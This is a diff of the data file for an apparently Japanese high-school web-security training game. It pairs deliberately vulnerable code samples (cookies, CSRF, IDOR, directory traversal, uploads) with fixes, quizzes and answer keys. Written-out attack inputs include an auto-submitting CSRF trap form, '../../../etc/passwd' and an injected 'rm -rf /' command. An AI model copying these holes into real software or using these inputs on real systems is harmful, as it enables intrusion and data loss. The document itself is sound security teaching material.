+      { t: "ストレッチング", d: "ハッシュ化を何回も繰り返して計算に時間がかかるようにし、総当たり攻撃を難しくする方法。" },
+      { t: "レインボーテーブル", d: "パスワードとハッシュ値の対応をあらかじめ計算しておいた表。ハッシュ値から元のパスワードを素早く調べるのに使われる。" },
+      { t: "ブルートフォース攻撃", d: "考えられる全ての文字の組み合わせを順番に試す攻撃。総当たり攻撃。" },
+      { t: "辞書攻撃", d: "辞書に載っている単語や、よく使われるパスワードを順番に試す攻撃。" },
+      { t: "パスワードリスト攻撃", d: "別のサービスから流出したIDとパスワードの組み合わせを使ってログインを試す攻撃。使い回しが狙われる。" },
+      { t: "リバースブルートフォース攻撃", d: "パスワードを1つに固定し、IDの方を次々と変えてログインを試す攻撃。" },
+    ],
   },
+
+  /* ---------------- 6. Cookieとセッション ---------------- */
   {
-    title: "サーバー設定ファイルの診断",
-    client: "依頼主：まなび高校 情報担当",
-    type: "設定ファイル / 設定ミス",
-    scenario: "学校のWebサーバーを新しく立てました。設定ファイルをチェックしてください。",
-    lines: [
-      '# server.conf',
-      'server_name          = manabi-web',
-      'listen_port          = 80',
-      'debug_mode           = true',
-      'admin_user           = admin',
-      'admin_password       = admin',
-      'ssh_port             = 22',
-      'ssh_permit_root_login = yes',
-      'allow_ip             = 0.0.0.0/0',
-      'log_level            = info',
+    id: "cookie", name: "Cookieとセッション管理", cat: "auth",
+    story: "パスワードを守っても、ログインした後の「通行証」を盗まれたら意味がない。ブラックマンバはCookieを狙ってきた。",
+    variants: [
+      {
+        title: "ログイン後の通信の診断", client: "依頼主：まなび高校 Webサイト担当", type: "HTTPレスポンス",
+        scenario: "ログイン成功時にサーバーが返している通信の中身（HTTPヘッダ）です。Cookieの設定を確認してください。",
+        lines: [
+          'HTTP/1.1 200 OK',
+          'Content-Type: text/html; charset=UTF-8',
+          'Set-Cookie: session_id=10023; Path=/',
+          'Set-Cookie: user_role=student; Path=/',
+          'Set-Cookie: theme=dark; Path=/',
+          'Cache-Control: no-store',
+        ],
+        vulns: [
+          { line: 2, name: "推測しやすく、保護属性のないセッションID", why: "10023 のような連番は、10024 などに変えるだけで他人になりすませる。さらに Secure / HttpOnly / SameSite 属性がなく、盗まれやすい。", fix: "Set-Cookie: session_id=（推測できない長いランダム値）; Path=/; Secure; HttpOnly; SameSite=Lax" },
+          { line: 3, name: "権限をCookieで管理", why: "Cookieは利用者が自由に書き換えられる。user_role=admin に変えるだけで管理者になれてしまう。", fix: "# 権限はサーバー側で管理し、CookieにはセッションIDだけを入れる" },
+        ],
+        neutral: [],
+        hint: "Cookieは利用者のブラウザに保存され、利用者が自由に書き換えられる。",
+      },
+      {
+        title: "ログイン処理（ブラウザ側）の診断", client: "依頼主：学校お知らせアプリ開発チーム", type: "JavaScript",
+        scenario: "ログインに成功したあと、ブラウザ側で情報を保存する処理です。",
+        lines: [
+          'function onLogin(user) {',
+          '  document.cookie = "session=" + user.token;',
+          '  localStorage.setItem("password", user.password);',
+          '  document.cookie = "isAdmin=" + user.isAdmin;',
+          '  document.cookie = "lang=ja";',
+          '}',
+        ],
+        vulns: [
+          { line: 1, name: "セッションCookieをJavaScriptで作成", why: "JavaScriptから作ったCookieにはHttpOnlyを付けられないので、XSSがあると盗まれる。Secure属性もない。", fix: "# セッションCookieはサーバーが Set-Cookie で発行する\nSet-Cookie: session=...; Secure; HttpOnly; SameSite=Lax" },
+          { line: 2, name: "パスワードをブラウザに保存", why: "localStorageはJavaScriptから誰でも読める。XSS一発でパスワードが盗まれる。", fix: "// パスワードはブラウザに保存しない" },
+          { line: 3, name: "管理者フラグをCookieに保存", why: "isAdmin=true に書き換えるだけで管理者扱いになる可能性がある。", fix: "// 権限の判定は必ずサーバー側で行う" },
+        ],
+        neutral: [],
+        hint: "穴は3つ。「盗まれやすい保存のしかた」と「書き換えられたら困る情報」。",
+      },
     ],
-    vulns: [
-      { line: 3, name: "デバッグモードが有効",
-        why: "エラー時に内部の情報（ソースコードやパス、設定）が外部に丸見えになる。本番では必ずオフ。",
-        fix: "debug_mode = false" },
-      { line: 5, name: "初期パスワードのまま",
-        why: "admin / admin は攻撃者が真っ先に試す組み合わせ。",
-        fix: "admin_password = （長くて推測されにくいパスワード）" },
-      { line: 7, name: "rootでのSSHログインを許可",
-        why: "最強の権限を持つrootに直接ログインを試され続ける。破られたら全てを奪われる。",
-        fix: "ssh_permit_root_login = no\n# 一般ユーザー + 鍵認証でログインし、必要なときだけ権限を上げる" },
-      { line: 8, name: "全世界からのアクセスを許可",
-        why: "0.0.0.0/0 は「すべてのIPアドレス」。管理機能まで世界中から触れてしまう。",
-        fix: "allow_ip = 192.168.10.0/24   # 校内ネットワークだけ" },
+    quizzes: [
+      { q: "Cookieに付けると「JavaScriptから読めなくなる」属性は？", choices: ["Secure", "HttpOnly", "Path", "Expires"], answer: 1, explain: "HttpOnlyを付けると、XSSがあってもスクリプトからCookieを盗まれにくくなります。SecureはHTTPSのときだけ送る属性です。" },
+      { q: "【試験風】他人のセッションIDを盗んだり推測したりして、その人になりすましてサービスを利用する攻撃はどれか。", choices: ["セッションハイジャック", "フィッシング", "DNSキャッシュポイズニング", "ゼロデイ攻撃"], answer: 0, explain: "セッション（ログイン状態）を乗っ取るので、セッションハイジャックと呼びます。" },
     ],
-    neutral: [2, 4, 6],
-    hint: "穴は4つ。「開発用の設定」「初期値」「権限」「誰が接続できるか」。",
-    quiz: {
-      q: "サーバーを公開する前にやるべきことでないものは？",
-      choices: ["初期パスワードを変更する", "デバッグモードを切る", "不要なアクセスを制限する", "管理者パスワードを全員に共有する"],
-      answer: 3,
-      explain: "パスワードの共有は危険です。誰が何をしたか追えなくなり、漏れる可能性も高くなります。"
-    }
+    lesson: {
+      what: "Webサイトは、ログインした人に「セッションID」という通行証を発行し、Cookieとしてブラウザに保存させます。次のアクセスからは、この通行証を見て「さっきログインした人だ」と判断します。つまりセッションIDを盗まれると、パスワードを知らなくてもなりすましされてしまいます。",
+      exampleLabel: "安全なCookieの例：",
+      example: "Set-Cookie: session_id=Xk9…（長いランダム値）; Secure; HttpOnly; SameSite=Lax\n\nSecure   … HTTPS（暗号化通信）のときだけ送る\nHttpOnly … JavaScriptから読めなくする（XSS対策）\nSameSite … 他のサイトからのリクエストに付けない（CSRF対策）",
+      danger: "セッションハイジャック（ログイン状態の乗っ取り）。Cookieに権限などを入れていると、書き換えで管理者になりすまされる。",
+      defense: [
+        "セッションIDは推測できない長いランダムな値にする",
+        "Secure・HttpOnly・SameSite 属性を付ける",
+        "権限などの大事な情報はCookieに入れず、サーバー側で管理する",
+        "ログインしたらセッションIDを新しく作り直す",
+        "パスワードをブラウザ（Cookie・localStorage）に保存しない",
+      ],
+      tip: "フリーWi-FiでHTTP（暗号化なし）のサイトを使うと、Cookieを盗み見られることがあります。Secure属性とHTTPSが大切な理由です。",
+    },
+    examPoint: "Cookieの属性（Secure・HttpOnly）と、セッションハイジャック・セッションフィクセーション（固定化）攻撃の名前が問われます。",
+    terms: [
+      { t: "Cookie", d: "Webサーバーがブラウザに小さなデータを保存させる仕組み。ログイン状態の維持などに使われる。" },
+      { t: "セッションID", d: "ログイン中の利用者を識別するためにサーバーが発行する識別子。Cookieに保存されることが多い。" },
+      { t: "セッションハイジャック", d: "他人のセッションIDを盗んだり推測したりして、その人になりすます攻撃。" },
+      { t: "Secure属性", d: "HTTPSで通信するときだけCookieを送るようにする属性。" },
+      { t: "HttpOnly属性", d: "JavaScriptからCookieを読めないようにする属性。XSSでCookieを盗まれるのを防ぐ。" },
+    ],
   },
+
+  /* ---------------- 7. CSRF ---------------- */
   {
-    title: "成績確認APIの診断",
-    client: "依頼主：成績管理システム開発チーム",
-    type: "Python / アクセス制御の不備（IDOR）",
-    scenario: "ログインした生徒が /api/grades/自分の番号 で成績を見られるAPIです。SQLはプレースホルダを使ってるので安全です！",
-    lines: [
-      '@app.route("/api/grades/<int:student_id>")',
-      '@login_required',
-      'def get_grades(student_id):',
-      '    grades = db.query("SELECT * FROM grades WHERE student_id = ?", student_id)',
-      '    return jsonify(grades)',
+    id: "csrf", name: "CSRF（クロスサイトリクエストフォージェリ）", cat: "web",
+    story: "Cookieを盗めなくなったブラックマンバは、作戦を変えた。「盗む」のではなく、ログイン中の生徒に「勝手に操作させる」つもりだ。",
+    variants: [
+      {
+        title: "メールアドレス変更機能の診断", client: "依頼主：学校ポータル開発チーム", type: "HTML / Python",
+        scenario: "ログイン中の生徒が、登録メールアドレスを変更できる機能です。ログインしていないと使えないので安全とのこと。",
+        lines: [
+          '<!-- 設定変更フォーム -->',
+          '<form action="/settings/email" method="GET">',
+          '  <input name="email">',
+          '  <button>変更</button>',
+          '</form>',
+          '',
+          '@app.route("/settings/email")',
+          '@login_required',
+          'def change_email():',
+          '    current_user.email = request.args["email"]',
+          '    db.save(current_user)',
+        ],
+        vulns: [
+          { line: 1, name: "GETで大事な変更をしている", why: "GETはURLを開くだけで実行される。罠ページに <img src=\"/settings/email?email=攻撃者のアドレス\"> を置くだけで、見た人の設定が勝手に変わる。", fix: '<form action="/settings/email" method="POST">' },
+          { line: 9, name: "CSRF対策なし", why: "本人が自分の意思で送ったリクエストかどうかを確認していない（CSRFトークンなし）。ログインしていても、罠ページ経由のリクエストを区別できない。", fix: "# フォームに推測できないCSRFトークンを埋め込み、受け取ったら照合する\nif request.form[\"csrf_token\"] != session[\"csrf_token\"]:\n    abort(403)" },
+        ],
+        neutral: [6, 10],
+        hint: "ログイン中の人が「罠ページを開いただけ」で、この処理が動いてしまわないか？",
+      },
+      {
+        title: "購買ポイント送信機能の診断", client: "依頼主：購買部ポイントシステム担当", type: "Python",
+        scenario: "購買部のポイントを友達に送れる機能です。POSTを使っているし、ログイン確認もしています。",
+        lines: [
+          '@app.post("/points/send")',
+          '@login_required   # ログインしていればOK',
+          'def send_points():',
+          '    to = request.form["to"]',
+          '    amount = int(request.form["amount"])',
+          '    current_user.points -= amount',
+          '    db.add_points(to, amount)',
+          '    return "送信しました"',
+        ],
+        vulns: [
+          { line: 1, name: "CSRF対策なし", why: "ログインしているかしか確認していない。罠ページに自動送信フォームを置かれると、見た人のポイントが勝手に送られる。POSTにするだけでは防げない。", fix: "# CSRFトークンを照合する（多くのフレームワークに機能がある）\n# Cookieに SameSite=Lax を付けるのも有効" },
+          { line: 5, name: "金額のチェックなし", why: "マイナスの値や、持っている以上の値を送れてしまう。amount=-1000 なら相手からポイントを奪える。", fix: "if amount <= 0 or amount > current_user.points:\n    abort(400)" },
+        ],
+        neutral: [4, 6],
+        hint: "「本人の意思か」の確認と、「送る量」の確認。",
+      },
     ],
-    vulns: [
-      { line: 3, name: "アクセス制御の不備（IDOR）",
-        why: "ログインさえしていれば、URLの番号を書き換えるだけで他人の成績が見られる。SQLは安全でも「その人が見ていいデータか」をチェックしていない。",
-        fix: "if student_id != current_user.id:\n    abort(403)   # 自分のデータ以外は拒否" },
+    quizzes: [
+      { q: "CSRF対策として最も適切なものは？", choices: ["フォームにCSRFトークンを入れて照合する", "パスワードを長くする", "画像を圧縮する", "エラーメッセージを丁寧にする"], answer: 0, explain: "罠ページの作成者はトークンを知らないので、トークンがないリクエストを拒否すれば防げます。" },
+      { q: "【試験風】利用者がログインしたまま罠のページを閲覧すると、利用者の意図しない処理（書き込みや設定変更など）を正規のWebサイトで実行させられる攻撃はどれか。", choices: ["クロスサイトリクエストフォージェリ", "クロスサイトスクリプティング", "ディレクトリトラバーサル", "中間者攻撃"], answer: 0, explain: "リクエストを偽造（フォージェリ）するのでCSRFと呼びます。XSSと名前が似ているので注意。" },
     ],
-    neutral: [0, 2],
-    hint: "/api/grades/1001 を /api/grades/1002 に変えたら…？",
-    quiz: {
-      q: "「ログインしているか」と「そのデータを見る権限があるか」を確認すること、それぞれ何と呼ぶ？",
-      choices: ["認証 と 認可", "暗号 と 復号", "送信 と 受信", "保存 と 削除"],
-      answer: 0,
-      explain: "認証＝本人かどうかの確認、認可＝その人に何を許すかの確認。このAPIは認証はあるけど認可が抜けていました。"
-    }
+    lesson: {
+      what: "ログイン中の利用者に罠のページを開かせ、その人の名前で勝手に操作（書き込み・設定変更・送金など）をさせる攻撃です。ブラウザは、どのページから送られたリクエストでも、そのサイトのCookie（ログイン状態）を自動で付けてしまうため、サイト側は本人の操作と区別できません。",
+      exampleLabel: "攻撃者が用意する罠ページ：",
+      example: '<form action="https://points.manabi.jp/points/send" method="POST">\n  <input type="hidden" name="to" value="attacker">\n  <input type="hidden" name="amount" value="1000">\n</form>\n<script>document.forms[0].submit();<\/script>\n\n→ ログイン中の生徒がこのページを開いた瞬間、勝手にポイントが送られる',
+      danger: "勝手な書き込み、パスワードやメールアドレスの変更（→乗っ取り）、勝手な購入や送金など。",
+      defense: [
+        "フォームに推測できないCSRFトークンを入れ、サーバー側で照合する",
+        "Cookieに SameSite 属性を付け、他サイトからのリクエストにCookieを付けないようにする",
+        "大事な操作の前にパスワードの再入力を求める",
+        "状態を変える処理にGETを使わない（POSTなどにする）",
+      ],
+      tip: "XSSは「スクリプトを動かす」攻撃、CSRFは「リクエストを偽造する」攻撃。名前は似ていますが別物です。",
+    },
+    examPoint: "XSSとCSRFの区別がよく問われます。CSRFの説明文の特徴は「ログインした状態で」「罠のページ」「意図しない処理」です。",
+    terms: [
+      { t: "CSRF", d: "クロスサイトリクエストフォージェリ。ログイン中の利用者に罠ページを開かせ、意図しない処理を実行させる攻撃。" },
+      { t: "CSRFトークン", d: "フォームごとにサーバーが発行する推測できない値。リクエストが正規のページから送られたかを確認するために使う。" },
+      { t: "SameSite属性", d: "他のサイトから送られるリクエストにCookieを付けるかどうかを制御する属性。CSRF対策になる。" },
+    ],
   },
+
+  /* ---------------- 8. 認証と認可 ---------------- */
   {
-    title: "ネットワーク診断ツールの診断",
-    client: "依頼主：情報部の先輩",
-    type: "Python / OSコマンドインジェクション",
-    scenario: "Webからpingを打てる便利ツールを作ったよ。ホスト名を入れると結果が表示されるんだ。",
-    lines: [
-      'import os',
-      '@app.route("/ping")',
-      'def ping():',
-      '    host = request.args.get("host")',
-      '    result = os.popen("ping -c 1 " + host).read()',
-      '    return "<pre>" + result + "</pre>"',
+    id: "idor", name: "認証と認可（アクセス制御）", cat: "auth",
+    story: "ブラックマンバの次の標的は成績データだ。ログインはできても「見ていいデータ」まで正しく制限されているだろうか。",
+    variants: [
+      {
+        title: "成績確認APIの診断", client: "依頼主：成績管理システム開発チーム", type: "Python",
+        scenario: "ログインした生徒が /api/grades/自分の番号 で成績を見られるAPIです。SQLはプレースホルダを使っているので安全です！",
+        lines: [
+          '@app.route("/api/grades/<int:student_id>")',
+          '@login_required',
+          'def get_grades(student_id):',
+          '    grades = db.query("SELECT * FROM grades WHERE student_id = ?", student_id)',
+          '    return jsonify(grades)',
+        ],
+        vulns: [
+          { line: 3, name: "アクセス制御の不備（IDOR）", why: "ログインさえしていれば、URLの番号を書き換えるだけで他人の成績が見られる。SQLは安全でも「その人が見ていいデータか」をチェックしていない。", fix: "if student_id != current_user.id:\n    abort(403)   # 自分のデータ以外は拒否" },
+        ],
+        neutral: [0, 2],
+        hint: "/api/grades/1001 を /api/grades/1002 に変えたら…？",
+      },
+      {
+        title: "マイページと管理画面の診断", client: "依頼主：学校ポータル開発チーム", type: "HTML / Python",
+        scenario: "生徒用のマイページです。管理画面へのリンクは生徒には見えないように隠してあります。",
+        lines: [
+          '<!-- マイページ（生徒用） -->',
+          '<a href="/mypage">マイページ</a>',
+          '<a href="/admin" style="display:none">管理画面</a>',
+          '',
+          '@app.route("/admin")',
+          'def admin_page():',
+          '    return render_template("admin.html", users=db.all_users())',
+          '',
+          '@app.post("/messages/<int:msg_id>/delete")',
+          '@login_required',
+          'def delete_message(msg_id):',
+          '    db.delete("messages", msg_id)',
+        ],
+        vulns: [
+          { line: 2, name: "見た目で隠しているだけ", why: "display:none は画面に表示しないだけ。HTMLを見ればURLが分かるし、直接 /admin を開けば入れる。", fix: "<!-- 管理者でなければリンク自体を出さない。ただし本当の対策はサーバー側 -->" },
+          { line: 5, name: "管理画面に認証・認可がない", why: "ログインも管理者かどうかも確認していないので、URLを知っていれば誰でも全ユーザーの情報を見られる。", fix: "@app.route(\"/admin\")\n@login_required\n@admin_required   # 管理者だけ許可\ndef admin_page():" },
+          { line: 11, name: "他人のメッセージも削除できる", why: "メッセージの持ち主が本人かを確認していない。番号を変えれば他人のメッセージを消せる。", fix: 'msg = db.get("messages", msg_id)\nif msg.owner_id != current_user.id:\n    abort(403)' },
+        ],
+        neutral: [4, 6, 10],
+        hint: "穴は3つ。「隠しただけ」「チェックがない」「持ち主の確認がない」。",
+      },
     ],
-    vulns: [
-      { line: 4, name: "OSコマンドインジェクション",
-        why: "host に「8.8.8.8; rm -rf /」のように「;」で別のコマンドを続けると、サーバー上で好きなコマンドを実行されてしまう。",
-        fix: 'import subprocess, ipaddress\nip = ipaddress.ip_address(host)        # IPアドレスか検証\nsubprocess.run(["ping", "-c", "1", str(ip)], capture_output=True)' },
-      { line: 5, name: "出力をエスケープせず表示（XSS）",
-        why: "コマンドの結果や入力がそのままHTMLとして返されるので、スクリプトを埋め込まれる可能性がある。",
-        fix: 'from html import escape\nreturn "<pre>" + escape(result) + "</pre>"' },
+    quizzes: [
+      { q: "「ログインしているか」と「そのデータを見る権限があるか」を確認すること、それぞれ何と呼ぶ？", choices: ["認証 と 認可", "暗号 と 復号", "送信 と 受信", "保存 と 削除"], answer: 0, explain: "認証＝本人かどうかの確認、認可＝その人に何を許すかの確認です。" },
+      { q: "【試験風】利用者や管理者に対して、業務を行うために必要な最小限の権限だけを与えるという考え方はどれか。", choices: ["最小権限の原則", "多層防御", "職務分掌", "フェールセーフ"], answer: 0, explain: "権限を必要最小限にしておけば、乗っ取られたりミスをしたりしたときの被害も小さくなります。" },
     ],
-    neutral: [3],
-    hint: "穴は2つ。シェルでは「;」や「&&」で複数のコマンドをつなげられる。",
-    quiz: {
-      q: "OSコマンドインジェクション対策として良いのは？",
-      choices: ["シェルを使わず、引数をリストで渡す＋入力を検証する", "コマンド名を大文字にする", "pingの回数を増やす", "結果を画像で返す"],
-      answer: 0,
-      explain: "シェルを経由しないと「;」などの特殊記号が解釈されません。さらに入力がIPアドレスかどうか検証すると安心です。"
-    }
+    lesson: {
+      what: "「認証」は『あなたは誰？』を確かめること（ログイン）。「認可」は『あなたは何をしていい？』を決めること。ログインのチェックだけして、そのデータを見る権限があるかを確認し忘れると、他人のデータにアクセスできてしまいます。この脆弱性を IDOR（安全でない直接オブジェクト参照）と呼びます。",
+      exampleLabel: "URLの番号を書き換えるだけで…",
+      example: "自分の成績：/api/grades/1001\n↓ 番号を1つ変える\n他人の成績：/api/grades/1002  ← 見えてしまう！",
+      danger: "他人の成績・住所・メッセージなどの個人情報が見られる。番号を順番に変えれば全員分を集められてしまう。",
+      defense: [
+        "サーバー側で毎回「この人がこのデータを見ていいか」をチェックする",
+        "画面にボタンを出さないだけ（見た目で隠すだけ）では対策にならない",
+        "管理機能には、ログインに加えて管理者かどうかの確認を必ず入れる",
+        "推測しにくいIDにするのは補助的な対策。それだけでは不十分",
+      ],
+      tip: "SQLインジェクション対策（プレースホルダ）が完璧でも防げない、というのがポイント。脆弱性ごとに対策は別物です。",
+    },
+    examPoint: "「認証と認可の違い」「最小権限の原則」「アクセス制御」は、情報セキュリティマネジメント試験の定番テーマです。",
+    terms: [
+      { t: "認証", d: "利用者が本人であるかどうかを確認すること。英語でAuthentication。" },
+      { t: "認可", d: "認証された利用者に、何をしてよいかの権限を与えること。英語でAuthorization。" },
+      { t: "最小権限の原則", d: "利用者やプログラムには、仕事に必要な最小限の権限だけを与えるという考え方。" },
+      { t: "アクセス制御", d: "誰がどの情報やシステムに、どんな操作をしてよいかを制限する仕組み。" },
+    ],
   },
+
+  /* ---------------- 9. ディレクトリトラバーサル ---------------- */
   {
-    title: "スマホアプリ用設定の診断",
-    client: "依頼主：学校お知らせアプリ開発チーム",
-    type: "JavaScript / 秘密情報の埋め込み",
-    scenario: "このconfig.jsはブラウザ（利用者のスマホ）にそのまま配信されます。",
-    lines: [
-      '// config.js（ブラウザに配信される）',
-      'const API_BASE    = "https://api.manabi-app.jp";',
-      'const API_KEY     = "sk_live_9f8a7b6c5d4e3f2a1b";',
-      'const DB_PASSWORD = "P@ssw0rd2024";',
-      'function fetchNews() {',
-      '  return fetch(API_BASE + "/news?key=" + API_KEY);',
-      '}',
+    id: "traversal", name: "ディレクトリトラバーサル", cat: "web",
+    story: "ブラックマンバはサーバーの奥深くにある重要なファイルを狙い始めた。ファイルを扱う機能を重点的に調べよう。",
+    variants: [
+      {
+        title: "ファイルダウンロード機能の診断", client: "依頼主：学校の配布資料サイト", type: "Python",
+        scenario: "プリントのPDFを /download?file=xxx.pdf でダウンロードできるようにしました。",
+        lines: [
+          'from flask import request, send_file',
+          '@app.route("/download")',
+          'def download():',
+          '    filename = request.args.get("file")',
+          '    path = "/var/www/uploads/" + filename',
+          '    return send_file(path)',
+        ],
+        vulns: [
+          { line: 4, name: "ディレクトリトラバーサル", why: "file=../../../etc/passwd のように「../」を使うと、uploadsフォルダの外にある重要なファイルまで読めてしまう。", fix: "from werkzeug.utils import secure_filename\npath = os.path.join(UPLOAD_DIR, secure_filename(filename))\n# さらに、許可したファイル一覧と照合するとより安全" },
+        ],
+        neutral: [3, 5],
+        hint: "ファイル名に「../」が入っていたらどうなる？",
+      },
+      {
+        title: "画像表示機能の診断", client: "依頼主：写真部ギャラリーサイト", type: "JavaScript (Node.js)",
+        scenario: "/image?name=xxx.jpg で写真を表示する機能です。「../」は消しているので対策済み、とのこと。",
+        lines: [
+          'const express = require("express");',
+          'const fs = require("fs");',
+          'app.get("/image", (req, res) => {',
+          '  const name = req.query.name.replace("../", "");',
+          '  const data = fs.readFileSync("./public/images/" + name);',
+          '  res.send(data);',
+          '});',
+        ],
+        vulns: [
+          { line: 3, name: "不十分な対策", why: "replace は最初の1か所しか消さない。「../../」なら2つ目が残る。「....//」のように書くと、消した後に「../」ができあがる。", fix: "// 消すのではなく、パスを正規化して範囲内かを確認する\nconst p = path.resolve(BASE, name);\nif (!p.startsWith(BASE + path.sep)) return res.status(400).end();" },
+          { line: 4, name: "ディレクトリトラバーサル", why: "結局、利用者の入力がそのままファイルのパスになっている。", fix: "// path.basename() でファイル名部分だけを取り出すなど" },
+        ],
+        neutral: [5],
+        hint: "「../」を1回消すだけで本当に安全？",
+      },
     ],
-    vulns: [
-      { line: 2, name: "APIキーのハードコード",
-        why: "ブラウザに配られるファイルは誰でも中身を見られる。本番用（live）の秘密キーが盗まれ、なりすましや高額請求に使われる。",
-        fix: "// 秘密キーはサーバー側の環境変数に置き、\n// ブラウザ → 自分のサーバー → 外部API の順で中継する" },
-      { line: 3, name: "DBパスワードの埋め込み",
-        why: "データベースのパスワードが丸見え。しかも推測されやすい。",
-        fix: "// DBのパスワードはサーバー側だけで管理。フロントには絶対に置かない" },
+    quizzes: [
+      { q: "「../」の意味は？", choices: ["1つ上のフォルダ", "ファイルの削除", "管理者権限", "ファイルの圧縮"], answer: 0, explain: "「../」は1つ上のフォルダを表します。何回も重ねると、本来見せてはいけない場所までたどり着けてしまいます。" },
+      { q: "【試験風】Webアプリケーションで、ファイル名の指定に「../」などを含めることにより、公開を意図していないファイルにアクセスする攻撃はどれか。", choices: ["ディレクトリトラバーサル", "バッファオーバーフロー", "SQLインジェクション", "セッションハイジャック"], answer: 0, explain: "ディレクトリ（フォルダ）を横断（トラバーサル）するので、この名前です。" },
     ],
-    neutral: [5],
-    hint: "ブラウザの「開発者ツール」を開けば、このファイルは誰でも読める。",
-    quiz: {
-      q: "ソースコードに秘密情報を書いてGitHubに公開してしまった！まずやるべきことは？",
-      choices: ["ファイルからその行を消してコミットすれば大丈夫", "すぐにキーやパスワードを無効化・変更する", "リポジトリの名前を変える", "誰も見てないはずなので放置"],
-      answer: 1,
-      explain: "公開された瞬間に自動で収集されることもあります。履歴にも残るので、行を消すだけでは不十分。まずキー自体を無効化しましょう。"
-    }
+    lesson: {
+      what: "ファイル名に「../」（1つ上のフォルダ）を混ぜて、公開しているフォルダの外にある、見せてはいけないファイルを読み出す攻撃です（トラバーサル＝横断・通り抜け）。パス・トラバーサルとも呼ばれます。",
+      exampleLabel: "/download?file=../../../etc/passwd を送ると…",
+      example: "/var/www/uploads/../../../etc/passwd\n\n uploads → www → var → / （ルート）までさかのぼって\n→ 実際に読まれるのは /etc/passwd（サーバーのユーザー一覧）",
+      danger: "設定ファイル、パスワード、他の人がアップロードしたファイルなど、サーバー内の重要な情報が読まれる。",
+      defense: [
+        "利用者から受け取ったファイル名をそのままパスに使わない",
+        "「番号 → ファイル名」の対応表を用意し、番号で指定させる",
+        "パスを整理（正規化）したあと、許可したフォルダの中かどうか確認する",
+        "「../」を消すだけの対策は回避されやすいので頼らない",
+        "Webサーバーには必要なファイルだけ読める権限を与える",
+      ],
+      tip: "フォルダの階層構造（ツリー）と「相対パス」「絶対パス」の考え方を知っていると理解しやすい攻撃です。",
+    },
+    examPoint: "攻撃の説明文から名前を答える問題が多く出ます。キーワードは「../」「公開を意図していないファイル」です。",
+    terms: [
+      { t: "ディレクトリトラバーサル", d: "ファイル名に「../」などを含めて、公開されていないファイルに不正にアクセスする攻撃。" },
+      { t: "相対パス", d: "今いる場所（カレントディレクトリ）を基準にしたファイルの場所の書き方。「../」は1つ上を表す。" },
+      { t: "絶対パス", d: "一番上の階層（ルート）から順に書いた、ファイルの場所の書き方。" },
+    ],
   },
+
+  /* ---------------- 10. ファイルアップロード ---------------- */
   {
-    title: "最終ミッション：攻撃の痕跡を探せ",
-    client: "依頼主：まなび高校 情報担当（緊急）",
-    type: "アクセスログ / インシデント調査",
-    scenario: "サーバーの様子がおかしい！アクセスログから攻撃の痕跡を全部見つけてください。",
-    lines: [
-      '10.0.0.5     [05/Nov 09:00:01] "GET /index.html" 200',
-      '10.0.0.8     [05/Nov 09:00:03] "GET /news" 200',
-      '203.0.113.9  [05/Nov 09:01:10] "POST /login user=admin" 401',
-      '203.0.113.9  [05/Nov 09:01:10] "POST /login user=admin" 401',
-      '203.0.113.9  [05/Nov 09:01:11] "POST /login user=admin" 401',
-      '10.0.0.5     [05/Nov 09:02:00] "GET /about" 200',
-      '198.51.100.4 [05/Nov 09:03:15] "GET /search?q=\' OR 1=1 --" 500',
-      '198.51.100.4 [05/Nov 09:03:20] "GET /download?file=../../etc/passwd" 200',
-      '10.0.0.8     [05/Nov 09:04:00] "GET /contact" 200',
+    id: "upload", name: "ファイルアップロード", cat: "web",
+    story: "ファイルを「読む」機能は守った。今度は「置く」機能だ。ブラックマンバはサーバーに危険なファイルを送り込もうとしている。",
+    variants: [
+      {
+        title: "課題提出機能の診断", client: "依頼主：情報科の先生", type: "Python",
+        scenario: "生徒が課題の画像をアップロードできる機能です。拡張子のチェックもしています。",
+        lines: [
+          '@app.post("/upload")',
+          'def upload():',
+          '    f = request.files["file"]',
+          '    if not f.filename.endswith((".jpg", ".png", ".php")):',
+          '        return "画像のみアップロードできます", 400',
+          '    f.save("/var/www/html/uploads/" + f.filename)',
+          '    return "アップロード完了"',
+        ],
+        vulns: [
+          { line: 3, name: "危険な拡張子を許可", why: "許可リストに .php が入っている。PHPファイルを置かれてアクセスされると、サーバー上でプログラムが実行される（Webシェル）。", fix: 'ALLOWED = {".jpg", ".png"}\nif os.path.splitext(f.filename)[1].lower() not in ALLOWED:' },
+          { line: 5, name: "元のファイル名のまま公開フォルダに保存", why: "ファイル名に ../ を入れられたり、同じ名前で他人のファイルを上書きされたりする。さらにWebから直接実行できる場所に保存している。", fix: "name = uuid.uuid4().hex + \".png\"   # ランダムな名前にする\nf.save(os.path.join(STORAGE_DIR, name))   # 実行されない場所に保存" },
+        ],
+        neutral: [2],
+        hint: "許可している拡張子をよく見よう。保存する場所と名前は？",
+      },
+      {
+        title: "プロフィール画像機能の診断", client: "依頼主：学校SNS開発チーム", type: "JavaScript (Node.js)",
+        scenario: "プロフィール画像（PNG）を登録できる機能です。ファイルの種類もチェックしています。",
+        lines: [
+          'app.post("/avatar", upload.single("img"), (req, res) => {',
+          '  if (req.file.mimetype !== "image/png") return res.status(400).send("PNGのみ");',
+          '  // ファイルサイズの制限は特になし',
+          '  const dest = "public/avatars/" + req.file.originalname;',
+          '  fs.renameSync(req.file.path, dest);',
+          '  res.send("<img src=\'/avatars/" + req.file.originalname + "\'>");',
+          '});',
+        ],
+        vulns: [
+          { line: 1, name: "偽装できる種類チェック", why: "mimetype は送る側が自由に書き換えられる。中身がプログラムでも「image/png」と名乗れば通ってしまう。", fix: "// ファイルの中身（先頭のバイト列）を調べる。画像として読み込み直して保存する" },
+          { line: 2, name: "サイズ制限なし", why: "巨大なファイルを大量に送られると、サーバーのディスクがいっぱいになり止まってしまう（DoS）。", fix: 'upload = multer({ limits: { fileSize: 2 * 1024 * 1024 } })   // 2MBまで' },
+          { line: 3, name: "元のファイル名をそのまま使用", why: "ファイル名に ../ を入れて別の場所に置かれたり、他人の画像を上書きされたりする。", fix: 'const dest = "public/avatars/" + crypto.randomUUID() + ".png";' },
+          { line: 5, name: "ファイル名をそのままHTMLに出力（XSS）", why: "ファイル名に ' onerror=… などを入れられると、スクリプトが実行される。", fix: "// 自分で作ったランダムな名前を使い、出力時はエスケープする" },
+        ],
+        neutral: [4],
+        hint: "穴は4つ。「種類」「大きさ」「名前」「表示のしかた」。",
+      },
     ],
-    vulns: [
-      { line: 2, name: "パスワード総当たり（ブルートフォース）①",
-        why: "同じIPから1秒間に何度もadminへのログイン失敗（401）。機械で総当たりしている。",
-        fix: "ログイン失敗が続いたらロック・待ち時間を入れる。多要素認証を導入する。" },
